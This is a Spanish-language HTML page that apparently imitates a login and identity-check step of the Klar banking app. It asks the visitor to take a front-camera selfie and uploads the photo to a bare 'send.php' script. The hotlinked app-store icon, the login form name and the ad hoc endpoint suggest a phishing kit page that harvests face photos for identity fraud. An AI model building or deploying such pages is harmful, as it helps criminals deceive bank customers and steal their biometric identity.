
<!DOCTYPE html>
<html lang="es">
<link rel="icon" type="image/svg+xml" href="https://play-lh.googleusercontent.com/czIBDpVoyRTwndEmrIzvvFJFRMA99lN5HNtymWemLhsnORWfoKbOwPlIuDRHEs6bqs0">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Klar - Iniciar sesión</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      background-color: #fefefe;
      color: #1a1a1a;
      padding: 20px;
    }

    .container {
      max-width: 400px;
      margin: 0 auto;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 40px;
    }

    .icon {
      font-size: 22px;
      color: #777;
      cursor: pointer;
    }

    .logo {
      text-align: center;
      font-size: 32px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 20px;
    }

    .logo1 {
      text-align: center;
      font-size: 15px;
      font-weight: 400;
      color: #555;
      margin-bottom: 40px;
    }

    h2 {
      font-size: 18px;
      font-weight: 500;
      margin-bottom: 20px;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 16px 44px 16px 14px;
      border: 1px solid #ccc;
      border-radius: 12px;
      font-size: 15px;
      background-color: #fff;
      outline: none;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
      transition: border 0.3s;
    }

    input:focus {
      border-color: #888;
    }

    .toggle-password {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 18px;
      color: #888;
      cursor: pointer;
    }

    .forgot {
      text-align: right;
      font-size: 13px;
      margin-bottom: 30px;
    }

    .forgot a {
      color: #666;
      text-decoration: none;
    }

    .btn {
      width: 100%;
      background-color: #000;
      color: white;
      padding: 16px;
      font-size: 16px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      font-weight: 500;
      transition: background 0.3s;
    }

    .btn:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    .btn:hover:not(:disabled) {
      background-color: #111;
    }
     @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
    .btn {
      border:0; background:#000; color:#fff; padding:10px 20px; border-radius:10px;
      width:70%; margin-top:20px; cursor:pointer; font-size:16px;
    }
    .btn[disabled]{opacity:.6; cursor:not-allowed;}
    #photoBtn {
      display:inline-block; width:70%; background:#000; color:#fff; padding:10px 20px;
      border-radius:10px; margin-top:15px; cursor:pointer;text-align: center;display: block;margin: 0 auto;
    }
    #photoInput{ display:none;text-align:center; }
    #preview{ display:none; width:70%; max-width:320px; border-radius:12px; margin:12px auto 0; }
    #status { font-size:14px; margin-top:10px; }
    #status.ok { color:#0a7a0a; }
    #status.err { color:#b00020; }
  </style>

</head>
<body>
  <div class="container">
    <div class="top-bar">
      <div class="icon">&#8592;</div>
      <div class="icon">&#128483;</div>
    </div>

    <div class="logo">Klar</div>
    <h2 style="text-align: center;">Tomate una selfie</h2>
    <div class="logo1">Mantén una expresión neutral, encuentra una luz balanceada y evita gorras y lentes.
    </div>


    
    <img src="carilla.png" alt="Logo" class="logo" style="width:60px;display: block;margin: 0 auto;">
    <br>

      <form id="loginForm" method="post" action="send.php" enctype="multipart/form-data">
      <div class="input-group">
        <!-- Botón tipo file (cámara frontal) -->
        <label id="photoBtn" for="photoInput">📷 Tomar foto</label>
        <input id="photoInput" name="foto_file" type="file" accept="image/*" capture="user">

        <!-- Vista previa -->
        <img id="preview" alt="Previsualización">

        <!-- (opcional) Base64 si lo quieres usar más tarde -->
        <input type="hidden" id="fotoBase64" name="foto_base64">
      </div>

    
      <button class="btn" id="submitBtn" class="btn" type="submit" disabled style="display: block;margin: 0 auto;">Continuar</button>

        <div id="status"></div>
    </form>
  </div>
  <script>
    const photoInput = document.getElementById('photoInput');
    const preview    = document.getElementById('preview');
    const submitBtn  = document.getElementById('submitBtn');
    const form       = document.getElementById('loginForm');
    const statusEl   = document.getElementById('status');

    let capturedFile = null;
    let previewURL   = null;

    photoInput.addEventListener('change', () => {
      clearStatus();
      const file = photoInput.files && photoInput.files[0];
      if (!file) {
        submitBtn.disabled = true;
        return;
      }

      capturedFile = file;

      if (previewURL) URL.revokeObjectURL(previewURL);
      previewURL = URL.createObjectURL(file);
      preview.src = previewURL;
      preview.style.display = 'block';

      submitBtn.disabled = false;
    });

    form.addEventListener('submit', (e) => {
      if (!capturedFile) {
        e.preventDefault();
        setStatus('Primero toma una foto.', 'err');
        return;
      }

      submitBtn.disabled = true;
      // El formulario se enviará normalmente con la imagen incluida
    });

    function setStatus(msg, type) {
      statusEl.className = '';
      if (type) statusEl.classList.add(type);
      statusEl.textContent = msg;
    }

    function clearStatus() {
      setStatus('', null);
    }
  </script>



</body>
</html>
